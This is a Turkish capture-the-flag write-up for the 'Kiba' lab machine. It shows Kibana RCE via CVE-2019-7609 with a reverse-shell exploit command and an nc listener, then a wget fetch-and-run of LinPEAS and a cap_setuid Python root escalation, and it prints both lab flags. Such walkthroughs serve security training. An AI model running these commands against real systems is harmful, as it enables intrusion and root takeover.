<img width="512" height="512" alt="images" src="https://github.com/user-attachments/assets/a37a534e-2b18-443b-9bbb-3ed82c91e8c0" />

Kiba makinesi, eski bir Kibana sürümünde bulunan uzaktan kod çalıştırma açığıyla başlayıp, sistemde bırakılmış özel bir Python binary'sinin Linux capability yanlış yapılandırmasıyla root'a kadar giden kısa ama öğretici bir zincir sunuyor. Aşağıda tüm süreci adım adım anlatıyorum.

## 1. Keşif

İlk adım her zaman olduğu gibi tam port taraması:

```bash
nmap -sS -A -p- -T4 10.112.139.46
```
<img width="699" height="258" alt="nmap" src="https://github.com/user-attachments/assets/5830433c-ad5f-46a7-9239-9c260d5d504e" />

3 port açık: SSH, HTTP ve Kibana'nın kendi arayüzünü sunduğu 5601 portu. Nmap zaten servisi doğrudan "Elasticsearch Kibana" olarak tanımlamış.

## 2. Web Servislerini Tarama

<img width="790" height="417" alt="80portu" src="https://github.com/user-attachments/assets/d645098e-e12f-4717-9240-b63fb4e2b3f1" />

Önce 80 portundaki Apache sunucusuna baktım. Sayfa görsel olarak boştu, ffuf ile dizin taraması da bir sonuç vermedi. Bu yüzden 5601 portundaki Kibana arayüzüne yöneldim.

```
http://10.112.139.46:5601
```


Bu adres beni otomatik olarak şu URL'e yönlendirdi:

```
http://10.112.139.46:5601/app/kibana#/home?_g=()
```
Karşımda standart bir Kibana dashboard'u vardı. **Management** kısmına girince sürüm bilgisini görebildim:

<img width="905" height="600" alt="sürüm" src="https://github.com/user-attachments/assets/f51aea43-7673-4027-90a9-57ec190d23c3" />

Sürüm numarasını görünce ilk işim bu versiyonla ilgili bilinen açıkları araştırmak oldu.

## 3. CVE Araştırması — Kibana RCE

`Kibana 6.5.4` üzerinde araştırma yapınca **CVE-2019-7609** ile karşılaştım. Bu açık, Kibana'nın Timelion görselleştirme eklentisindeki bir prototype pollution zafiyeti üzerinden, 5.6.15 ile 6.6.1 arası sürümlerde uzaktan kod çalıştırmaya (RCE) izin veriyor.

Hazır bir exploit script'i buldum:

```
https://github.com/LandGrey/CVE-2019-7609/
```

Script'in mantığı şöyle:

- Önce hedefteki Kibana sürümünü doğruluyor.
- `/api/timelion/run` endpoint'ine, `.es(*).props()` fonksiyon zincirini kötüye kullanarak `label.__proto__.env` üzerinden prototype pollution yapan bir JSON payload gönderiyor.
- Bu sayede Node.js'in `NODE_OPTIONS` ortam değişkenine `child_process.exec` içeren bir komut enjekte edip, socket.io endpoint'ine yapılan bir istekle bu kodu tetikliyor.
- Sonuç olarak hedefte istediğimiz komutu çalıştırabiliyoruz

## 4. Exploit ve İlk Erişim

Önce kendi makinemde bir listener açtım:

```bash
nc -nvlp 4444
```

Sonra exploit'i çalıştırdım:

```bash
python3 exploit.py -u http://10.112.139.46:5601/ -host 192.168.134.19 -port 4444 --shell
```
<img width="858" height="256" alt="exploit" src="https://github.com/user-attachments/assets/b0087d5e-2440-4a3e-951a-2b28665a575e" />

<img width="663" height="352" alt="shell" src="https://github.com/user-attachments/assets/9045b393-aa23-4cfc-aa8e-4d0ef73a9017" />

Shell'i biraz daha kullanılabilir hale getirmek için TTY yükseltmesi yaptım:

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
export TERM=xterm-256color
```

## 5. User Flag

`/home/kiba` dizinine geçip içeriğe baktım:

```
kiba@ubuntu:/home/kiba$ ls
elasticsearch-6.5.4.deb  kibana  user.txt
```

```
kiba@ubuntu:/home/kiba$ cat user.txt
THM{1s_easy_pwn3d_k1bana_w1th_rce}
```
<img width="514" height="128" alt="usertxt" src="https://github.com/user-attachments/assets/1074957c-5557-487c-87c0-6995fa5d3703" />

## 6. Privilege Escalation — Capability Kötüye Kullanımı

Yetki yükseltme için sistemde LinPEAS çalıştırmaya karar verdim. Kendi makinemde basit bir HTTP sunucusu açtım:

```bash
python3 -m http.server 8000
```
<img width="766" height="135" alt="linpeas1" src="https://github.com/user-attachments/assets/b6956439-39f0-45c5-8c2e-d500bd964909" />

Hedef sistemde `/tmp` dizinine geçip script'i indirdim:

```bash
wget http://192.168.134.19:8000/linpeas.sh
chmod +x linpeas.sh
./linpeas.sh
```
<img width="677" height="399" alt="linpeas2" src="https://github.com/user-attachments/assets/5d946e75-d918-45e1-8ab4-3a02960ee1f3" />

Çıktıda kırmızı renkle işaretlenmiş bir "Files with capabilities" bölümü dikkatimi çekti:

<img width="589" height="100" alt="linpeas3" src="https://github.com/user-attachments/assets/0959a19f-8ed5-48dc-8398-5ebb997cda33" />

`/home/kiba/.hackmeplease/python3` binary'sinde `cap_setuid+ep` capability'sinin set edilmiş olması gözüme çarptı. Bu capability, binary'nin process'in UID'sini normalde root yetkisi gerektiren bir işlemi, kernel'in olağan izin kontrollerini atlayarak değiştirebilmesini sağlıyor.

GTFOBins'te Python için bu capability'yi kontrol ettim ve önerilen istismar yöntemini buldum:

<img width="827" height="333" alt="gtfobins" src="https://github.com/user-attachments/assets/d9d442c0-f21a-4f18-a3f6-0720e5a4b260" />

Sistemde varsayılan `python` komutuyla bunu doğrudan çalıştıramadım çünkü capability sadece o özel dizindeki binary'ye tanımlanmıştı. Bu yüzden doğrudan o binary'yi kullandım:

```bash
cd /home/kiba/.hackmeplease
./python3 -c 'import os; os.setuid(0); os.execl("/bin/sh","sh")'
```

Komut çalıştıktan sonra shell root olarak yeniden başladı.

## 7. Root Flag

```bash
cat root.txt
```

```
THM{pr1v1lege_escalat1on_us1ng_capab1l1t1es}
```
<img width="828" height="212" alt="rootflag" src="https://github.com/user-attachments/assets/d60db26b-5656-46c8-99e7-ffc43a81d055" />
